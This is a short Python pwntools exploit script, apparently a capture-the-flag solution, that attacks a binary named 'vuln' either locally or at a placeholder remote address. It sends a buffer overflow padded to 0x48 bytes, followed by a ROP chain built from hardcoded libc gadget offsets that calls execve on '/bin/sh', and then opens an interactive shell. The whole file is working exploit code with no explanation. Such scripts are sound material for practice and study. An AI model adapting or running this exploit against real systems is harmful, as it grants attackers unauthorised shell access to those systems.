#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.binary = exe
context.arch = 'amd64'
context.terminal = ["urxvt", "-e", "sh", "-c"]


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.DEBUG:
			gdb.attach(r)
	else:
		r = remote("addr", 1337)

	return r


def main():
	r = conn()
	#gdb.attach(r)

	# good luck pwning :)



	libc.addr = 0x007ffff7dd5000

	p_rdi =	libc.addr + 0x23796 
	p_rsi = libc.addr + 0x2590f
	p_rdx = libc.addr + 0xc770d
	p_rax = libc.addr + 0x3be88
	syscall = libc.addr + 0x550da
	bash_addr = libc.addr + next(libc.search(b"/bin/sh\0"))

	payload = b"A"*0x48
	payload += p64(p_rdi)
	payload += p64(bash_addr)
	payload += p64(p_rsi)
	payload += p64(0)
	payload += p64(p_rdx)
	payload += p64(0)
	payload += p64(p_rax)
	payload += p64(0x3b)
	payload += p64(syscall)

	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()
